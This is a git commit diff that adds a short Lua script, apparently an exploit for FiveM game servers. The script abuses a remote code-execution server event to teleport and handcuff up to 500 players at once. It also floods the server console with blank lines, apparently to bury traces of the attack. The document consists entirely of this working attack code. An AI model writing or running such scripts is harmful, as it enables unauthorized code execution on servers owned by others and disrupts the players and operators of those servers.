5d823bd316cf144a4d35f3a803a770c6da3181a3
0x98a <81833678+0x98a@users.noreply.github.com>
2021-04-13 11:40:58 +0200

    Create TPAllFiveM.lua

---
+++ TPAllFiveM.lua
@@ -0,0 +1,10 @@
+TriggerServerEvent('RunCode:RunStringRemotelly', [[
+    for i = 1,500 do
+    vRPclient.teleport(i, {-74, -819, 326})
+    vRPclient.toggleHandcuff(i,{})
+    end
+    for i = 1,500 do 
+        RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
+        RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
+    end
+]])
